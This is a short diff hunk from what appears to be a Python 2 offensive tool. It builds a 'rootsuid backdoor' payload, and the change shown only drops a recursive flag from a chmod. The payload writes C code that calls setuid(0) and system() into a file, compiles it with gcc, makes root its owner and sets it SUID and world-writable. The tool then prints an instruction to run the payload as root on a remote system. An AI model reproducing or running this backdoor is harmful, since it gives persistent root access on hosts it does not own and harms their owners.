@@ -16,7 +16,7 @@ if self.argv[1] == 'generate':
     print 'To activate the rootsuid backdoor, execute this payload AS ROOT on the remote system:'
 
     backdoor = 'main(){setuid(0);system("%s");}' % pipe
-    payload  = "chmod -R 777 %d;echo -e '%b'>%f;gcc -x c -o %f %f;chown root %f;chmod 4777 %f"
+    payload  = "chmod 777 %d;echo -e '%b'>%f;gcc -x c -o %f %f;chown root %f;chmod 4777 %f"
     payload = payload.replace('%b',backdoor)
     payload = payload.replace('%f',suidFile)
     payload = payload.replace('%d',suidDir)
